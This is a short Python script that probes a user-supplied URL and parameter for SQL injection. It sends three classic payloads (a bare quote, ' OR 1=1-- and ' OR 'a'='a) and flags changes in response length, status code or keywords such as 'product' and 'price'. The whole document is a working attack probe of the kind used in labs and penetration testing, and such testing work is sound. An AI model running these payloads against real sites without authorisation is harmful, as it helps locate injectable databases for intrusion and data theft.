import requests

url = input("Enter target URL: ")
param = input("Enter vulnerable parameter name: ")

payloads = ["'", "' OR 1=1--", "' OR 'a'='a"]
keywords = ["product", "price", "gift"]

baseline = requests.get(url, params={param: "test"})
baseline_len = len(baseline.text)
baseline_status = baseline.status_code

print("\nTesting SQL Injection payloads...\n")

for payload in payloads:
    r = requests.get(url, params={param: payload})

    length_diff = abs(len(r.text) - baseline_len)
    status_changed = r.status_code != baseline_status
    keyword_found = any(k in r.text.lower() for k in keywords)

    if length_diff > 100 or status_changed or keyword_found:
        print(f"[+] Possible SQLi detected with payload: {payload}")
        print(f"    Length diff: {length_diff}, Status: {r.status_code}")
    else:
        print(f"[-] No significant change for payload: {payload}")

